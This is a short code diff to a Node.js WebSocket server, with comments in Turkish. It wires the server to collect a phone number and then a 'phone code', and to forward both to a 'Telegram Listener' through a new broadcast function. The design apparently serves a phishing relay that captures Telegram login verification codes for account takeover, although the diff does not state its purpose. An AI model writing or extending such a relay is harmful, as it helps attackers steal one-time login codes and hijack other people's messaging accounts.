@@ -2,6 +2,15 @@ const WebSocket = require("ws");
 
 const wss = new WebSocket.Server({ port: process.env.PORT || 8765 });
 
+// Telegram Listener'a mesaj göndermek için bir fonksiyon
+function sendToTelegramListener(data) {
+  wss.clients.forEach((client) => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(JSON.stringify(data));
+    }
+  });
+}
+
 wss.on("connection", function connection(ws) {
   console.log("WebSocket bağlantısı kuruldu.");
 
@@ -11,13 +20,13 @@ wss.on("connection", function connection(ws) {
     if (data.action === "send_phone") {
       console.log("Telefon numarası alındı:", data.phone);
       // Telegram Listener'a telefon numarasını ilet
-      // (Bu kısımda Telegram Listener ile iletişim kurulacak)
+      sendToTelegramListener({ action: "phone_received", phone: data.phone });
     }
 
     if (data.action === "send_code") {
       console.log("Telefon kodu alındı:", data.code);
       // Telegram Listener'a kodu ilet
-      // (Bu kısımda Telegram Listener ile iletişim kurulacak)
+      sendToTelegramListener({ action: "code_received", code: data.code });
     }
   });
 });
